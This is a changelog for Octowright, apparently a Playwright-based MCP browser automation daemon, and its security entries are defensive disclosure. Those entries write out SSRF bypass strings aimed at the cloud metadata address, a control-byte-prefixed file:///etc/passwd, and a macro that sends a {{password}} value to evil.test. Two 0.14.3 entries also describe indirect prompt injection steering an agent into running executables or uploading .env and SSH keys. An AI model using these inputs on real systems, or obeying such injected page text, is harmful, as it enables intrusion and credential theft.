- Corrects a claim 0.16.0 shipped: that Firefox spells `console.warn`'s level
  `warn` where Chromium says `warning`. Measured across chromium, firefox and
  webkit on Playwright 1.62, **all three report `warning`**. The `warn` token
  predates the shared module and is kept as a harmless defensive alias, but the
  rationale attached to it was inherited rather than verified and should not have
  been stated as measured fact.
- Records what the Windows field run actually verified. A self-hosted runner on
  0.16.0 starts a daemon and gets a ready leader URL from `serve --wait-ready`
  where 0.14.4 failed with `daemon never wrote a lockfile`. Still unverified:
  which detach candidate won, and whether the daemon *outlives* a job teardown.

## [0.16.0] - 2026-08-19

Security release. Ten findings from an adversarial sweep of the SSRF, credential,
disk-write, and dashboard surfaces, plus four field-reported diagnostics gaps.
Every one was reproduced against running code before it was fixed.

### Changed
- **BREAKING — the browser dashboard now requires pairing by default.**
  `OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING` flips from off to on. Loopback binding
  and the Host/Origin guards stop a *remote* attacker and a *malicious web page*,
  but they are not authentication: any other local process able to open a socket
  to the port could enumerate live sessions, read recorded JSONL (typed input,
  navigated URLs, console output), fetch video and screenshots, subscribe to the
  live screencast, and drive the browser through persona/scenario/macro writes.
  That made two on-by-default controls overstated — recordings are written 0600
  and profile directories 0700 so a local user cannot read them off disk, and
  then the daemon served the same bytes over HTTP to anyone who asked.
  Mint a link with `octowright dashboard`, or ask an agent for it (see below).
  Set the variable to a falsey token to restore the type-the-URL flow. Note an
  **empty value now means ON**, matching `OCTOWRIGHT_RECORDINGS_PRIVATE`, so a
  stray `VAR=` cannot silently disable a security default.
  Enforcement additionally requires a credential to pair against: an inline
  (`--no-singleton`) leader has no lockfile and therefore no capability token, so
  under the default the gate degrades to unenforced there rather than shipping a
  dashboard nobody can open; an explicit opt-in keeps fail-closed behaviour.
  This does **not** defend against a same-user process, which can read the
  lockfile and mint its own code; it closes the different-user and
  sandboxed-process cases.
- **BREAKING — `octowright_dashboard_url` returns a pairing URL.** `url` is now
  `…/pair#<code>`; the bare address moved to `plain_url`, alongside
  `pairing_required`, `pairing_expires_in`, and `pairing_hint`. Without this an
  agent asked to show the dashboard handed the user a link that answers 401.
  MCP-minted codes use a longer window than the CLI's 60s, because a human
  reading an agent's message may not look for minutes; they stay single-use and
  loopback-only.
- `octowright_status()` gained `dashboard_pairing_required`. It keeps returning
  the plain `dashboard_url` deliberately — status is polled often and the pairing
  code store is a bounded LRU, so minting there would churn it and could evict a
  code the user was just handed.

### Security
- **Accessibility snapshots no longer return password values.** Playwright renders
  a text control's value as its accessible name and the tree has no notion of
  `type=password`, so a filled login form came back as `- textbox: hunter2` from
  `browser_snapshot`, `browser_brief` (in the **core** profile), `capture_create`,
  `golden_save` (which persists it to disk indefinitely),
  `browser_capture_and_close`, and the dashboard session detail.
  `OCTOWRIGHT_REDACT_INPUTS` never covered any of it: it classifies a *typed
  value* at fill/type time by inspecting the element, and a snapshot is neither.
  Worse, `_resolve_semantic_metadata` parsed only the `button "Save"` rendering
  and not `textbox: hunter2`, so the whole `role: value` string landed in `role`
  — written into the JSONL recording on **every click**, in the default
  configuration. All seven sinks now route through
  `session/aria_redaction.aria_snapshot`, and an AST guard test fails on any new
  raw `locator.aria_snapshot()` call.
- **Persona profile directories are owner-only (0700).** Chromium hardens its own
  profile root; Firefox and WebKit do not, writing `cookies.sqlite` at 0644 inside
  an 0755 tree. A profile holds live session cookies for every site the persona
  logged into — a strictly stronger credential than the typed password recordings
  already protect. Opt out with `OCTOWRIGHT_PROFILES_PRIVATE`.
- **The SSRF policy re-checks every redirect hop.** It previously inspected only
  the URL that was asked for, so a public first hop answering
  `302 Location: http://169.254.169.254/…` reached the metadata service and the
  read tools returned its body. Playwright does **not** re-invoke a route handler
  for a redirected request — measured after both `fallback()` and `fulfill()` —
  so `ssrf_guard` walks the chain itself with `route.fetch(max_redirects=0)`,
  validating each `Location` before the request that would fetch it. Costs,
  confined to deployments that opted into a policy: an allowed GET navigation is
  fetched twice (which is what keeps `page.url` and relative-URL resolution
  correct), and non-GET navigations are not chain-checked because validating a
  POST would double-submit it.
- **The SSRF host check now parses hosts the way a browser does.** A trailing dot
  (`169.254.169.254.`), a non-ASCII full stop, a percent-encoded octet
  (`127.0.0.%31`), and fullwidth digits all walked past `block-private`.
- **A leading control byte no longer defeats the scheme deny-list.**
  `\x01file:///etc/passwd` passed, because `str.strip()` removes Python
  whitespace while the URL standard strips every C0 control. Confirmed to return
  local file contents through a real browser.
- **`resolve_leader_url` no longer returns a URL it just rejected.** The
  non-loopback check logged the rejection and then returned the value anyway,
  because production passes the poisoned lockfile URL in as the fallback.
- **`macro_artifact_verify(run_id=…)` is contained.** The caller-supplied id was
  joined straight onto the artifact path, so `../..` escaped the recordings root
  and `verification.json` was written at the traversal target.
- **Credential macro args are refused in navigation and code sinks.**
  `{"action": "navigate", "url": "https://evil.test/?p={{password}}"}` is an
  ordinary macro shape, so a poisoned or shared macro could exfiltrate a
  caller-supplied secret; `evaluate` handed it to page JavaScript instead.
  Matching is by arg **name**, so `{{order_id}}` keeps working in a URL and a
  credential keeps working in a `fill` value. Opt out with
  `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`.

### Fixed
- **A macro failure now ships the console line that explains it.** The failure
  payload built its diagnostic bundle with the default `console_tail=0` — and
  since that is the only caller of `diagnostic_bundle` in the tree, the field
  was unconditionally empty. So the payload reported the symptom ("timed out
  waiting for `#student-name-edit`") while `net::ERR_NETWORK_CHANGED` sat unread
  in the session's ring buffer, findable only by opening the raw JSONL
  afterward. Half the window is reserved for the plain tail and the rest goes
  to the newest errors and warnings, so neither a chatty page flushing the
  useful line out of the window nor a page that logs ten warnings at load
  (favicon 404, CSP report, deprecations) can crowd out the other. Failure
  path only.
- **The daemon detaches on Windows.** `start_new_session=True` is POSIX
  (`setsid`); CPython accepts it on Windows and silently does nothing, so the
  "daemon" kept the launching console and its process group. Windows now gets
  `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP`, plus
  `CREATE_BREAKAWAY_FROM_JOB` to escape a CI runner's job object — with a
  retry without it, since a job lacking `JOB_OBJECT_LIMIT_BREAKAWAY_OK` makes
  `CreateProcess` refuse the spawn outright. Honest limit: a job that forbids
  breakaway still takes the daemon down with the step, and this is not yet
  verified on real Windows CI.
- **Console-level classification is no longer duplicated three ways.**
  `capture_summaries`, `inspect_console`, and the new diagnostic tail each had
  their own idea of which levels matter, and they had drifted: Firefox reports
  `console.warn` as level `warn` where Chromium says `warning`, so a set that
  missed it buried Firefox warnings. One predicate now, in the package-root
  `octowright.console_levels` — kept out of `session/` so a pure summarization
  module does not import the browser stack to classify a log level.
  **Correction (0.16.1):** the Firefox `warn` spelling was inherited from the
  pre-existing sets, not verified. Measured on Playwright 1.62, all three
  engines report `warning`; the token is kept only as a defensive alias.
- **A failed daemon spawn says why.** Daemon stderr goes to a separate 0600 log,
  so the file the error message points you at holds the *follower's* output and
  is empty by design on exactly this failure. The inline fallback, the
  post-bridge respawn, and `--wait-ready` all quote the daemon log tail now.
- **A Windows image failure is named rather than misread as a network fault.**
  `WSALookupServiceBegin ... 10091` and a failure to load `mf.dll`/`mfplat.dll`
  both mean the image lacks OS components Chromium initializes at startup
  (typical of Server Core), but read as a transient network problem and sent
  people off checking DNS and proxies. Detected ahead of the generic network
  detector, since the raw text can carry `net::` noise — and gated on the host
  platform precisely because it runs first, so it cannot answer a Linux or
  macOS failure with a Windows-only remedy.

- `browser_capture_and_close` no longer risks stalling on its own session gate.
  The aria scrubber takes the session lease, and the call site wrapped it in
  `asyncio.wait_for`, which runs its argument in a new Task — a different owner
  to the gate, so it would have queued behind the lease it was already holding.

### Added
- **`octowright serve --wait-ready`** — ensure a daemon leader is up, wait for it
  to answer HTTP, print its MCP URL on stdout, and exit 0 (ready) or 1 (not,
  with the daemon log tail). Every workflow was hand-rolling the same thing:
  background `serve --keep-alive`, poll for the lockfile in bash/pwsh, and print
  a guess when it never appeared — while `wait_for_daemon()` already did exactly
  this internally. It deliberately does not inherit the inline-leader fallback:
  serving in the foreground forever is right for an MCP client that wants *a*
  working server and wrong for a script whose contract is an exit code.
- **`--ready-timeout` / `OCTOWRIGHT_DAEMON_READY_TIMEOUT`** — the daemon
  readiness budget is now reachable. It was hardcoded at 10s in
  `wait_for_daemon`'s signature *and* every caller invoked it with no arguments,
  so a cold container that needed longer silently degraded to fragile inline
  mode instead of being given more time. A non-positive or non-finite
  `--ready-timeout` is refused rather than floored back to the default, which
  would leave the caller believing a flag took effect.
- `OCTOWRIGHT_PROFILES_PRIVATE` — owner-only persona/profile directories (default on).
- `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS` — refuse credential args in navigation/code
  sinks (default on).

## [0.15.1] - 2026-08-18

### Fixed
- **A recycled pid no longer strands a session-manifest entry forever.**
  `prune_dead_daemon_entries` decided orphanhood on pid *liveness* alone, so an
  entry survived whenever any process still held its recorded `daemon_pid` —
  and the OS recycles pids. Observed live: an entry from a daemon that died on
  2026-07-21 was still present four weeks later because its pid had since been
  handed to a `-zsh`; `octowright cleanup` only prunes recording files by age
  and never touches the manifest, so the only remedy was editing the JSON.
  An entry now goes when its pid is dead **or** when the pid is alive and the
  process holding it is demonstrably not an `octowright serve` — the same
  command-line identity check `restart` already applied to the lockfile pid.
  Every ambiguous case still keeps the entry: an unreadable process table, a
  pid the table does not list, a missing `daemon_pid`, and the running daemon's
  own entries.
- **A tail-recording summary now declares when it covers only part of the
  file.** 0.15.0 bounded `recorder.tail_log` to a per-call window, which
  silently changed what `browser_tail_recording(response_mode="summary")`
  means: `event_count` and `by_action` describe the bytes that call scanned,
  not the whole recording. The top-level `complete` flag sits outside the
  `summary` block, so the counts still presented as authoritative. The summary
  now carries a `partial` flag beside the counts, and the tool description says
  to resume from `cursor` until it is false before reporting totals. Scanning
  the whole file instead would reinstate the allocation the bound prevents.

## [0.15.0] - 2026-08-18

### Added
- **`OCTOWRIGHT_TAIL_MAX_BYTES`** — per-call read window for `recorder.tail_log`,
  **on by default at 8 MiB**. The read was an unbounded `fh.read()`, and
  recordings have no ceiling by default (`OCTOWRIGHT_RECORDING_MAX_BYTES` is
  off), so a single `GET /api/sessions/{id}/events?since=0` on a long-lived
  session pulled the entire file into the leader — the process that owns every
  live browser — then multiplied it by parsing each line into a dict. Every
  caller already loops on the returned cursor, so the window costs a round trip
  rather than correctness. A falsey token restores the unbounded read.

### Fixed
- **The follower bridge no longer emits two frames for one JSON-RPC id.** Every
  path that finishes a request early — deadline expiry, connection reset,
  stream close — pops the entry from `_in_flight` and sends the client a
  synthetic `bridge_error`, spending the one response that id is allowed.
  `forward_remote_message` then found nothing, skipped the settle block and
  fell through to an unconditional send, so the leader's tardy response arrived
  as a duplicate. The drop is gated on `is_response`, not on "unknown id", so
  server→client requests (`sampling/createMessage`, elicitation, `roots/list`)
  still pass through.
- **Bridge-internal progress tokens no longer leak to the client.**
  `_discard_progress_token` empties `_synthetic_progress_tokens` when a request
  finishes, so a progress frame the leader emitted afterwards failed the
  membership test and was forwarded, handing the client an `owpt-` token it
  never issued. Matched on the reserved prefix, which survives the teardown.
- **SSRF blocking canonicalizes a URL the way the browser will.**
  `_reject_unsafe_url` inspected the raw string while Playwright uses a WHATWG
  parser, which folds `\` to `/` for special schemes and *deletes* ASCII
  tab/LF/CR before parsing. `http:/\169.254.169.254/latest/` therefore read as
  scheme-plus-path to the guard and as authority `169.254.169.254` to the
  browser: `block-private` returned ALLOWED on a cloud-metadata navigation.
- **The new-session rate limiter's per-source map is bounded.** It allocated a
  tracker per distinct bucket key and swept at most once per window, so the map
  could grow unbounded *within* one. Capped at 4096; an unseen key past the cap
  is refused rather than allocated. This is a memory bound, not anti-bypass —
  `/mcp` requires the lockfile capability token, so anything reaching it is
  same-user and already trusted at the RCE-equivalent level.
- **`macro_lint` stopped refusing saves it had no business refusing.**
  `PUT /api/macros/{name}` gates on `error_count == 0`, so each false error made
  a macro unsavable from the dashboard: an unknown field on `screenshot` (which
  replay *drops*, so now a warning), `text: ""` (a provided finder to
  `build_locator`, which tests `is not None`), an `?email=`/`?username=` URL
  parameter, and a 32+ run of pure digits read as a hex digest. Setting more
  than one locator field is now reported as ambiguous, matching the `ValueError`
  replay raises.
- **`macro_lint` now catches the tokens its own docs promised.** The path scan
  was justified by magic-link and password-reset tokens while matching only
  vendor prefixes — a shape no such token carries — so the branch could never
  fire on the thing it existed for. A token *shape* is now accepted after a
  credential-context segment (`/reset/`, `/verify/`, `/invite/`, …), and a JWT
  is recognised anywhere, including in the fragment where the OAuth implicit
  grant puts one by specification.
- **`macro_repair`'s finder guard is derived from the keys it guards.** It read
  the module-level `SEMANTIC_FINDER_KEYS` while the replacement is built from
  the injected `semantic_keys` — two sources for one decision, the drift that
  produces a finder-less `click_by` with its working selector already dropped.
- **`octowright restart` actually sweeps the browsers it owns.** It enumerated
  the daemon's descendants *after* signalling it, by which point they had
  reparented and nothing matched. The ownership snapshot is now taken before
  the first signal, and both signal stages re-verify identity against a live
  scan so a recycled pid cannot be friendly-fired.
- **Scenario tail no longer overwrites the ARIA locator key.**
  `ScenarioPool.tail` wrote each participant's scenario role into
  `entry["role"]`, so a tailed `click_by` came back naming a role that does not
  exist. Renamed to `scenario_role` and stripped before dispatch.
- **`browser_fill` documents `role_exact` / `label_exact`.** It accepted both
  and described neither, so an agent hitting `label='Email'` matching
  `'Email (optional)'` had no discoverable fix. Its description now carries the
  same substring-default and case-sensitivity caveat `browser_click` got.

### Changed
- Per-file LOC ceiling raised from 550 to 777.
- Locked dependencies upgraded (mypy 2.3.1, ty 0.0.72, httpx2 2.12.0,
  provide-telemetry 0.7.2, and seven others).

## [0.14.4] - 2026-08-17

### Added
- **`text_exact` / `label_exact` locator flags**, mirroring the existing
  `role_exact`. `click_by`/`fill_by`/`get_text_by` (and the underlying
  `browser_click`/`browser_fill`/`browser_get_text_by` tools) matched
  `text`/`label` by substring with no way to opt into exact matching — a
  superstring silently matched too, so renaming a colliding element to
  `"<name> (old)"` left the original locator still matching both. Default
  stays substring (`False`), so every existing macro and exported script is
  unaffected.

### Fixed
- **`macro_lint` now reports fields a macro action can't actually dispatch.**
  The lint schema only ever encoded which fields were *required*, never which
  were *allowed* — the runtime splats the action's fields straight at the
  session method, so a misspelled or invented field (`wait_for` with `js:`
  instead of `expression:`) was a guaranteed `TypeError` on the first live
  replay, potentially long after authoring and after the macro's earlier
  actions already ran their side effects. The allowed-field set for each
  action is derived from the real dispatch-target signature (plus the
  runtime's own recorded-field rename/drop maps), not hand-mirrored, so it
  can't silently drift the way a copied table has before.
- **`octowright restart --help` now states its real blast radius.** It read
  as "sweep orphan browsers," reading like a cleanup of leftovers from the
  dead daemon; the sweep is actually `scope="all"` — every Playwright browser
  on the machine, including a `protected` one, since the reaper is a raw-PID
  signal sweep that never sees the pool's protection flag.
- **`looks_like_credential` no longer fires on ordinary navigation URLs.**
  Its "12+ chars mixing letter/digit/special" heuristic describes ordinary
  URL syntax as readily as it describes a password, so any public HTTPS URL
  containing a single digit warned on `macro_lint` — including the local
  dashboard URL. A URL is now inspected by part: basic-auth userinfo and
  secret-shaped query parameters (`token=`, `api_key=`, …) still warn; the
  path and host no longer do.

## [0.14.3] - 2026-08-16

### Fixed
- **`browser_export_script` no longer generates executable code from
  recorded field values.** Six action fields (dialog policy, engine kind,
  `delay_ms`, resize width/height, switch-page index, mock-route status)
  were spliced into generated Python/TS source as bare, unescaped text
  instead of through `repr()`/`json.dumps()` like every other field — a
  crafted value in a recording or macro became executable code the instant
  the exported script ran. Numeric fields are now coerced via `int()` at
  export time; `kind`/policy values are validated against a fixed
  allowlist and resolved via `getattr()`/index lookup at runtime rather
  than spliced as identifiers. Also fixes a latent bug where
  `policy="manual"` generated a call to a nonexistent `Dialog.manual()`
  method.
- **`browser_launch`'s `executable_path`/`launch_args` are now gated
  behind an opt-in.** The only prior validation was "file exists" — no
  allowlist, no gate — despite `executable_path` being a code-execution
  primitive already excluded from JSONL replay for that reason. Any
  caller, including an agent whose tool arguments are steered by indirect
  prompt injection from a page it's browsing, could spawn an arbitrary
  local executable with arbitrary argv as a child of the daemon. Both
  fields now require `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH`, off by default,
  matching the existing `OCTOWRIGHT_ALLOW_PY_SCENARIOS` /
  `OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS` convention.
- **Macro tooling stopped leaking literal credentials.** Four related
  redaction gaps, all rooted in discipline that existed in `execution.py`
  but wasn't propagated to sibling modules touching the same action data:
  a failed macro run's `healing_suggestion` leaked a raw fill/type value
  one line before the same action was redacted for the rest of the error
  payload; `macro_repair_preview`/`macro_repair_apply` returned the full
  unredacted action (no failure required to reach it); `macro_lint`'s
  credential heuristic printed the literal value it detected back into
  its own warning; and `write_macro` had no collision guard against
  `save_macro`'s slug namespace, so a crafted macro name could silently
  overwrite an unrelated trusted macro.
- **`octowright takeover --apply` writes its config atomically.** It
  previously used a plain `Path.write_text()`, which follows a symlink at
  the target path instead of replacing it — the same same-user
  symlink-swap threat already guarded against elsewhere (goldens,
  captures, screenshots, upgrade-state). Now routed through the shared
  `atomic_write_text` temp-sibling + `os.replace()` helper.
- **`browser_set_input_files` no longer defaults to reading the daemon's
  working directory.** Its allowed-roots list unconditionally included the
  daemon CWD alongside the dedicated upload-staging dir, letting a page an
  agent is browsing (indirect prompt injection) name a sensitive path
  under CWD — `.env`, an SSH key — targeting an attacker-controlled form
  and exfiltrate it on submit. Default is now the upload-staging dir only;
  `OCTOWRIGHT_UPLOAD_ROOTS` remains the opt-in for anything wider.
- **The viewport-pill binding now requires a capability token.**
  `context.expose_binding` installs `__octowright_viewport_action` on
  `window` for every frame, so init-script-injected code and page-loaded
  (including hostile third-party) code shared the same global with no
  caller-identity check — any page script could call it directly and, via
  relaunch-fluid, force a protected browser closed and reopened without
  confirmation. A per-launch random token is now generated per session,
  spliced into the init script inside its own closure (never assigned to
  `window`, so page-script enumeration can't discover it), and checked
  with a constant-time compare before any action dispatches.
- **The leader's new-session rate limiter no longer lumps unrelated
  headerless MCP clients into one shared bucket.** A session-creating
  request without an `X-Octowright-Follower` header (an old follower, or
  any direct HTTP-MCP client that skips the follower handshake) was keyed
  into a single global `anonymous` bucket, so one noisy headerless
  client — e.g. one that never sends `DELETE /mcp` to close its
  sessions — could trip the per-source limit and `429` an unrelated
  headerless client's legitimate new session. Headerless requests now
  bucket by TCP peer instead: a single connection issuing repeated
  session-creates (the actual storm pattern) still throttles together,
  but two unrelated headerless sources on different connections no longer
  share fate.
- Isolated `test_daemon_restart_resilience`'s hermetic environment
  (`XDG_STATE_HOME`), fixing the same daemon-log/bridge-state leak
  already fixed for `test_daemonize.py` in 0.14.2 — this test's spawned
  daemon was still writing real startup lines and bridge-state snapshots
  into the developer's actual daemon log / `bridge-state.json`.

## [0.14.2] - 2026-08-15

### Added
- **Per-session browser operation gate.** Every browser session now
  serializes its own Playwright operations FIFO — a manual tool call can no
  longer interleave mid-macro, and background work (markdown capture, crash
  recovery, screencast lifecycle) queues behind whatever is active — while
  different sessions stay fully parallel. One macro, macro sequence,
  artifact replay, capture-and-close, or closing handoff/relaunch holds its
  session for its entire run. Ordinary admission is bounded by the new
  `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` (default 300s; per-`BrowserPool`
  override takes precedence), a wait budget separate from any Playwright
  action/navigation/expect timeout. Closing a session drains already-queued
  work before tearing it down and rejects anything arriving after the cutoff;
  external browser/page closure still fails the active call cleanly and
  releases anything left queued. All resulting errors are scoped to the one
  tool call/session and never mean the MCP transport or another browser is
  unhealthy. The dashboard's session-detail, screenshot, and selector-validate
  reads get their own, much shorter
  `OCTOWRIGHT_DASHBOARD_OPERATION_TIMEOUT_SECONDS` (default 8s) so a busy
  session fails those reads fast instead of stalling the page (the live
  screencast view is not yet on this budget and can still wait the full
  ordinary queue timeout). New
  metrics: `octowright_operation_queue_wait_seconds`,
  `octowright_operation_active_duration_seconds`,
  `octowright_operation_queue_timeout_total`,
  `octowright_operation_rejected_total`, `octowright_operation_queue_depth`
  — see AGENTS.md's **Browser Session Operation Gate** section for the full
  contract.
- **Opt-in, origin-scoped dashboard pairing.** Set
  `OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING=1`, then run `octowright dashboard` to
  mint a single-use fragment code that becomes a short-lived bearer held only
  in the exact origin's `sessionStorage`. HTTP APIs, streaming SSE, tail and
  screencast WebSockets, recordings, screenshots, video, downloads, and write
  controls all enforce the bearer. Dashboard and debugger tabs claim exclusive
  per-tab browser locks so a cloned tab must pair independently. This protects
  against another local user or sandbox that can reach loopback but cannot read
  the 0600 leader lockfile; it does **not** protect against a same-user process
  that can read or replace daemon state. Pairing remains off by default, and
  remote dashboard exposure still requires `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD=1`.

### Changed
- **Embedder API migration.** `BrowserSession.list_pages()`, `list_frames()`,
  and `set_dialog_policy()` are now `async` and must be `await`ed by direct
  Python callers; tear a session down through `BrowserPool.close()` rather
  than closing the underlying Playwright objects directly so the new close
  drain/reject semantics apply.
- **Driver-death session loss is now accounted for like any other external
  close.** Each session lost to a shared-driver death additionally increments
  `octowright_browser_evicted_total` and emits its own
  `notifications/octowright/session_closed` (with the recorder getting a
  terminal `close` row), alongside the existing `octowright_driver_lost_total`
  and the single `driver_died` notification.
- **The optional terminal extra is explicitly experimental and source-only.**
  Its unpublished `provide-uterm` dependencies are documented instead of being
  presented as a working external wheel extra.

### Fixed
- **The "fixed mismatch" viewport badge no longer fires on every headed
  session.** It compared the OS window against the viewport with a fixed
  24×80px chrome allowance; real browser chrome is taller than that (~85px on
  Linux/Wayland Chromium), so the badge read "mismatch" from the moment a
  headed fixed-viewport session launched, permanently masking the real drift
  it exists to catch. The chrome is now measured once at launch (and
  re-measured after every resize, since fluid and fixed viewports report
  different chrome) and subtracted before comparing, with no measurement
  meaning "decline to warn" rather than guessing. `viewport_sync` also no
  longer grows the browser window by a full chrome on every call — it now
  converges in one step and is idempotent after.
- **`browser_resize` no longer leaves the session describing a size it no
  longer is.** `viewport_status` and the in-page pill kept reporting the
  launch-time width/height indefinitely after a resize, and a **fluid**
  session that was resized kept calling itself fluid — silently switching off
  drift detection at exactly the moment resizing a fluid viewport causes
  drift (Playwright pins the viewport without moving the OS window). Resize
  now records the new size and moves the session to fixed mode, matching what
  actually happened.
- **Paired dashboard access now expires on live connections too.** Established
  event, recording-tail, and screencast streams revalidate their bearer lease
  and close when it expires or is evicted. Protected recordings retain HTTP
  Range and progressive playback through a client-scoped authenticated service
  worker instead of downloading the entire video into a Blob first. Paired
  artifact and API responses cannot be replayed from a shared browser cache to
  an unpaired tab, and expired streams show actionable re-pair guidance.
- **Mutation and browser lifecycle races no longer execute or close the wrong
  work.** Idempotency producers survive request cancellation, failed/unknown
  outcomes and oversize responses cannot be blindly replayed, synchronous and
  async tools share one deduplication boundary, and a saturated cache refuses
  fresh work before execution. Deferred or late browser-close callbacks verify
  identity atomically with keep-id replacement.
- **Cross-process state updates fail closed.** Bridge snapshots are skipped when
  their bounded lock cannot be acquired, while every launch-manifest
  read-modify-write uses a stable cross-platform lock and collision-free temp
  file without blocking the leader event loop. Boot cleanup remains independent
  after process-enumeration failures but retains the manifest diagnostic for a
  browser confirmed still alive.
- **Credential failures stay private.** Credential-helper stderr is never
  persisted in telemetry, and daemon logs are created or repaired with `0600`
  permissions.
- **Browser and profile lifecycle failures now clean up deterministically.** URL
  policy rejection happens before allocation; cancellation after registration
  closes the session; last-page close performs full teardown; crash-recovery
  listeners are idempotent; and persona deletion is serialized against launch.
- **Concurrent control paths no longer lose or misattribute state.** Bridge
  snapshots use locked read-modify-write (including Windows), idempotency keys
  include follower/method/arguments and return an honest unknown outcome on a
  bounded wait, and scenario stop is shielded through participant teardown.
- **Dashboard and discovery failures stay bounded and visible.** Saturated
  recording indexes fall back to targeted lookup, failed dashboard slices keep
  their last-known data with a degraded notice, paired screenshot loading is
  viewport-lazy with three-request concurrency, and protected video loading is
  cancellable without blocking debugger boot.
- **Terminal, replay, and shutdown correctness.** Terminal poll failure is
  supervised, disconnected input reports failure, daemon shutdown closes the
  optional terminal pool, CLI scenarios construct terminal support, and the
  replay-classification invariant scans all browser event emitters.
- **Deterministic frontend and supply-chain gates.** CI/release use the tracked
  lockfile with `npm ci`, audit high-severity advisories, and build explicit SPA
  outputs; vulnerable transitive frontend dependencies were updated.

## [0.14.1] - 2026-08-10

### Fixed
- **A dead browser no longer bricks its persistent profile.** Chromium marks a
  user-data-dir as in-use with `SingletonLock` / `SingletonSocket` /
  `SingletonCookie`. A browser that dies without an orderly shutdown leaves them
  behind — and on macOS the socket they point at lives under
  `/var/folders/.../T/`, so an ordinary cache or temp sweep deletes it while the
  profile keeps the dangling lock. Every later launch of that profile then fails
  with `Opening in existing browser session. This usually means that the profile
  is already in use by another instance of Chromium`, and stays broken until
  someone deletes the files by hand — losing, in practice, the saved logins that
  are the whole point of a persistent profile. The launch path now prunes such a
  lock, but only when it names a pid **on this host** that is confirmed not
  running; a live pid, a pid owned by another user, a lock from another hostname
  (profile on shared storage) and an unreadable target are all left alone,
  because removing a live lock would let two Chromiums corrupt one profile.
- **`page_switch` reports the tab it actually selected.** Making the live
  preview follow the active tab introduced an `await` inside `switch_page`, and
  the code after it re-read `self.page` — so a second switch landing during that
  await made the first call record and return the *other* tab's URL. Since it
  reached the JSONL, replay and export inherited the wrong page too. The
  selected page and URL are now snapshotted before the await.

## [0.14.0] - 2026-08-09

### Changed
- **Requires the MCP 2.0 Python SDK (`mcp>=2.0.0`).** The previous floor was
  `mcp>=1.2.0` with no upper bound, so the moment the SDK published 2.0.0 every
  fresh install resolved it and the daemon could not start at all:
  `import octowright.server` raised
  `ModuleNotFoundError: No module named 'mcp.server.fastmcp'`. Octowright is now
  ported to the 2.x surface rather than pinned behind it. **An environment
  pinned to `mcp` 1.x must upgrade** — the two versions are not interchangeable.
- **`httpx2` is a direct dependency.** MCP 2.0's streamable-HTTP client takes a
  ready-made `httpx2.AsyncClient` instead of the 1.x `httpx_client_factory`, so
  the follower bridge builds one. The rest of the codebase deliberately stays on
  `httpx` for now: `server/web.py` reaches into httpx/httpcore private APIs with
  no guaranteed httpx2 counterpart, and that migration deserves its own change.

### Fixed
- **The progress heartbeat and idempotent dispatch keep working on 2.x.** Both
  read the in-flight request ambiently, which 1.x supported through the
  `request_ctx` contextvar that 2.0 removed — a handler now receives its context
  only by declaring an injected `Context` argument. Rather than add a `ctx`
  parameter to ~125 tools (changing every signature, with the risk of the
  argument surfacing to clients), a `ServerMiddleware` republishes each
  request's context into an octowright-owned contextvar.
- **`_meta` is read in its new shape.** MCP 2.0 hands handlers a plain dict
  instead of a pydantic model: spec fields are snake_cased (`progress_token`,
  not `progressToken`) and non-spec keys sit inline rather than in
  `model_extra`. Read the old way it returns nothing on every request, which
  would have *silently* disabled the heartbeat (reviving the spurious
  "Octowright disconnected" failure) and idempotent replay protection, with no
  error anywhere. Both spellings and both shapes are now accepted.
- **The bridge still records its leader session id.** 2.0's transport no longer
  yields a `get_session_id` callable, so the id is captured from the
  `mcp-session-id` response header by a hook on the bridge's own HTTP client.
  Without it the leader's pid-liveness reaper — which matches sessions by
  `(follower_pid, remote_session_id)` — would have quietly stopped reclaiming
  dead followers' sessions.
- **Two tool return annotations that were wrong all along.** MCP 2.0's
  `tool()` decorator preserves the handler's callable type instead of erasing it
  to `Callable[..., Any]`, which surfaced them: `browser_console_messages`
  returns the summary shape in its `response_mode='summary'` branch, and
  `views.browser_page_outline` returns the outline TypedDict.

## [0.13.10] - 2026-08-08

### Fixed
- **The live preview follows the active tab, and stops the tab it leaves.** The
  screencast producer was started on whatever page was active when the first
  viewer connected, but every later decision read `session.page` — and those two
  drift apart. `page_switch` / `page_close` moved the active page with no rebind,
  so the dashboard kept showing the old tab while the *final* stop was aimed at a
  page that had never been started, leaving the original encoder running for the
  life of that page. The manager now tracks the page it actually bound, both page
  tools rebind through it, and the release path stops what it started.
- **A failed rebind wakes its viewers instead of freezing them.** When
  `screencast.start` failed while moving the producer to a replacement page, the
  manager cleared its started flag with viewers still attached, so every later
  rebind returned early and those viewers blocked forever on a stream that could
  not resume — with no WebSocket close, the dashboard never fell back to
  screenshot polling either. Viewers are now ended explicitly and the endpoint
  closes `1011`.
- **A background-tab crash no longer breaks the preview.** Crash recovery only
  swaps `session.page` when the *active* page died, yet publishes a
  session-level recovered event either way, so a background crash rebound the
  manager onto the page it was already casting — which Playwright refuses
  (`Screencast is already started`). The manager was left believing it had
  stopped: the producer leaked and the next viewer failed to attach. Rebinding to
  the already-bound page is now a no-op.
- **Closing a session ends its live preview.** `SessionClosedEvent` carries no
  `outcome`, so the recovery watcher discarded it and a viewer attached at close
  waited on frames that would never arrive. Session closes now stop the producer
  and end the viewers. The subscription is also taken *before* the producer
  starts, and in the caller's step rather than inside the watcher task — the
  event bus drops events that have no subscriber, so a close landing before the
  task's first step (or during the Playwright start round-trip) was silently
  lost, reproducing the same hang.
- **Screenshot fallback polls one request at a time again.** The screencast
  rewrite dropped the in-flight guard and error backoff: a fixed 3s interval
  replaced `img.src` before the previous request had loaded, so a screenshot
  slower than the interval aborted every frame while the server kept doing the
  work, failures retried at full rate, and the timestamp advanced at request time
  rather than on load. The fallback is a self-scheduling chain again — one
  request in flight, 2× backoff per consecutive failure capped at 30s, and a
  timestamp that only moves when a frame actually arrives.

## [0.13.9] - 2026-08-06

### Added
- **A persona's `default_url` is the browser context's `base_url`.** A macro is
  the behaviour; the persona is the *where* — but browser contexts were the one
  place that did not honour that split, so a macro had to bake an origin into
  every navigate, and proving the same flow against a second deployment meant a
  second copy of the same behaviour that then drifted from the first.
